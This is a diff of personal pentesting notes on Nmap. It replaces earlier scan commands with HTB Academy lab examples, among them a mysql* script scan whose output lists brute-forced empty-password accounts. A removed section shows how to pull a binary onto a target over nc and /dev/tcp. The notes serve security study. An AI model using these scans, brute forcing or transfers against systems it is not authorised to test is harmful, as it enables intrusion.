@@ -3,77 +3,130 @@
 Tags: #💢
 Related to: 
 See also: [[nping]], [[ndiff]], [[ncat]]
-Previous: [[Information Gathering]], [[Getting Started]]
+Previous: [[Information Gathering]], [[Getting Started]], [[Network Enumeration with Nmap]]
 
 ## Description
+
 Nmap (“Network Mapper”) is a free and open source (license) utility for network discovery and security auditing. Many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime. Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. It was designed to rapidly scan large networks, but works fine against single hosts. Nmap runs on all major computer operating systems, and official binary packages are available for Linux, Windows, and Mac OS X. In addition to the classic command-line Nmap executable, the Nmap suite includes an advanced GUI and results viewer (Zenmap), a flexible data transfer, redirection, and debugging tool (Ncat), a utility for comparing scan results (Ndiff), and a packet generation and response analysis tool (Nping).
 
 Nmap was named “Security Product of the Year” by Linux Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It was even featured in twelve movies, including The Matrix Reloaded, Die Hard 4, Girl With the Dragon Tattoo, and The Bourne Ultimatum.
 
 ## Usage Examples
 
-### Fine order to scan new host
+### Examine service
 
-	nmap -sC -sV -oA nmap/reddish 10.10.10.94								    // default script & version scan on top 1000 ports
-	nmap -p0- -T5 --max-retries 0 -v -oA nmap/reddish-all-ports 10.10.10.94	// all ports quickly; no retries
-	nmap -p0- -T5 --max-retries 0 -v -oA nmap/reddish-all-ports 10.10.10.94	// retry on missed ports due to speed/retries
-	nmap -p 1880 -sC -sV -oA nmap/reddish-targeted 10.10.10.94				// targeted scan
+	sudo nmap 10.129.14.128 -sV -sC -p139,445
 
-### Get static binary onto target machine [^1]
+```text
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
+Nmap scan report for sharing.inlanefreight.htb (10.129.14.128)
+Host is up (0.00024s latency).
 
-	nc -lvnp 80 < nmap						// kali
-	cat < /dev/tcp/10.10.16.12/80 > nmap	// target
-	chmod +x nmap
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+MAC Address: 00:00:00:00:00:00 (VMware)
 
-### OS / version detection, traceroute, and script scanning
-	nmap -A -p0- --min-rate=1000 -Pn 10.10.110.100
+Host script results:
+|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-09-19T13:16:04
+|_  start_date: N/A
 
-### Fastest timing, no retransmission
-
-	nmap -sC -sV -oA nmap/allports-reddish -Pn -p0- -T5 --max-retries 0 -v 10.129.172.204
-
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.35 seconds
 ```
-Rarely use this as if it misses the port, it comes back empty.
+
+### Find FTP scripts
+
+	find / -type f -name ftp* 2>/dev/null | grep scripts
+
+```text
+/usr/share/nmap/scripts/ftp-syst.nse
+/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
+/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
+/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
+/usr/share/nmap/scripts/ftp-bounce.nse
+/usr/share/nmap/scripts/ftp-libopie.nse
+/usr/share/nmap/scripts/ftp-anon.nse
+/usr/share/nmap/scripts/ftp-brute.nse
 ```
 
-### Ping sweep
+### Run Script Wildcard
 
-	nmap -sn -T4 10.10.110.0/24 -oN active-hosts
+	sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
 
-### Scan using a specified script
+```text
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 00:53 CEST
+Nmap scan report for 10.129.14.128
+Host is up (0.00021s latency).
 
-	nmap --script smb-os-discovery.nse -p445 10.10.10.40
+PORT     STATE SERVICE     VERSION
+3306/tcp open  nagios-nsca Nagios NSCA
+| mysql-brute: 
+|   Accounts: 
+|     root:<empty> - Valid credentials
+|_  Statistics: Performed 45010 guesses in 5 seconds, average tps: 9002.0
+|_mysql-databases: ERROR: Script execution failed (use -d to debug)
+|_mysql-dump-hashes: ERROR: Script execution failed (use -d to debug)
+| mysql-empty-password: 
+|_  root account has empty password
+| mysql-enum: 
+|   Valid usernames: 
+|     root:<empty> - Valid credentials
+|     netadmin:<empty> - Valid credentials
+|     guest:<empty> - Valid credentials
+|     user:<empty> - Valid credentials
+|     web:<empty> - Valid credentials
+|     sysadmin:<empty> - Valid credentials
+|     administrator:<empty> - Valid credentials
+|     webadmin:<empty> - Valid credentials
+|     admin:<empty> - Valid credentials
+|     test:<empty> - Valid credentials
+|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
+| mysql-info: 
+|   Protocol: 10
+|   Version: 8.0.26-0ubuntu0.20.04.1
+|   Thread ID: 13
+|   Capabilities flags: 65535
+|   Some Capabilities: SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolOld, LongPassword, DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: YTSgMfqvx\x0F\x7F\x16\&\x1EAeK>0
+|_  Auth Plugin Name: caching_sha2_password
+|_mysql-users: ERROR: Script execution failed (use -d to debug)
+|_mysql-variables: ERROR: Script execution failed (use -d to debug)
+|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
+MAC Address: 00:00:00:00:00:00 (VMware)
 
-### Provide argument to script
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.21 seconds
+```
 
-	sudo nmap -sN -n --script /usr/share/nmap/scripts/dns-zone-transfer.nse --script-args domain=lightspeedhosting.com,server=NS1.LIGHTSPEEDHOSTING.COM
+### Trace script
 
-### Get a comma-separated list of port numbers.
-    ports=$(nmap -p0- --min-rate=1000 -T4 10.129.78.66 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
+	sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace
 
-### Do a default script and version check on those ports, displaying only open (or possibly open) ports.  
-	nmap -sC -sV -p$ports 10.129.78.66 --open
-
-### Set round trip time to receive a response from a slow service
-
-	netcat <port>
-	nmap <port> --min-rtt-timeout
-
-### Scan top 1,000 TCP Ports
-
-	nmap -sT --top-ports 1000 -v -oG -
-
-### Scan top 1,000 UDP Ports:
-
-	nmap -sU --top-ports 1000 -v -oG -
-
-### Grab banners
-
-	nmap -sV --script=banner scanme.nmap.org
-
-### Sort ports by order of use frequency
-
-	sort -r -k3 /usr/share/nmap/nmap-services
+```text
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 13:54 CEST                                                                                                                                                   
+NSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.14.136:21]                                   
+NSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 16 [10.129.14.136:21]             
+NSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 24 [10.129.14.136:21]
+NSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 32 [10.129.14.136:21]
+NSOCK INFO [11.4640s] nsock_read(): Read request from IOD #1 [10.129.14.136:21] (timeout: 7000ms) EID 42
+NSOCK INFO [11.4640s] nsock_read(): Read request from IOD #2 [10.129.14.136:21] (timeout: 9000ms) EID 50
+NSOCK INFO [11.4640s] nsock_read(): Read request from IOD #3 [10.129.14.136:21] (timeout: 7000ms) EID 58
+NSOCK INFO [11.4640s] nsock_read(): Read request from IOD #4 [10.129.14.136:21] (timeout: 11000ms) EID 66
+NSE: TCP 10.10.14.4:54226 > 10.129.14.136:21 | CONNECT
+NSE: TCP 10.10.14.4:54228 > 10.129.14.136:21 | CONNECT
+NSE: TCP 10.10.14.4:54230 > 10.129.14.136:21 | CONNECT
+NSE: TCP 10.10.14.4:54232 > 10.129.14.136:21 | CONNECT
+NSOCK INFO [11.4660s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 50 [10.129.14.136:21] (41 bytes): 220 Welcome to HTB-Academy FTP service...
+NSOCK INFO [11.4660s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 58 [10.129.14.136:21] (41 bytes): 220 Welcome to HTB-Academy FTP service...
+NSE: TCP 10.10.14.4:54228 < 10.129.14.136:21 | 220 Welcome to HTB-Academy FTP service.
+```
 
 ### NSE
 
@@ -104,28 +157,6 @@ Rarely use this as if it misses the port, it comes back empty.
 #### Run scripts whose categories are both vulnerable and safe.
 	nmap -p 445 --script "vuln and safe" -Pn -n -oA blue-vuln-and-safe-scripts 10.129.2.85
 
-### Common ports
-
-**Top 20**
-80, 23, 443, 21, 22, 25, 3389, 110, 445, 139, 143, 53, 3306, 8080, 1723, 111, 995, 993, 5900
-
-**Windows**  
-135, 137-139, 445, 3389  
-  
-**Linux**  
-22, 11  
-  
-Important Services | Ports
--------------------|------
-MSSQL|				1433, 1434
-Oracle|				1521, 1630
-DB2|				50000, 50001
-SAP|				3200, 3300
-Prostgres|			5432
-MariaDB, MySQL|		3306  
-Informix|			9088, 9089  
-ICS Protocols|		502 (Modbus), 20000 (DNP3), 44818 (Ethernet/IP)
-
 ### Additional TCP scans
 
 #### ACK Scan (-sA)
@@ -152,6 +183,7 @@ ICS Protocols|		502 (Modbus), 20000 (DNP3), 44818 (Ethernet/IP)
 
 
 ### IPv6
+
 	nmap -Pn -sV -6 fe80::20c0 -e eth0 --packet-trace
 
 	ping6 -I eth0 ff02::1	Multicast address for all link-local IPv6 nodes.
@@ -164,8 +196,6 @@ ICS Protocols|		502 (Modbus), 20000 (DNP3), 44818 (Ethernet/IP)
 	d		Increase debugging level.  
 	Shift	Function inverted when pressing p, v, or d.
 
----
-
-## References
+# References
 
 [^1]: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
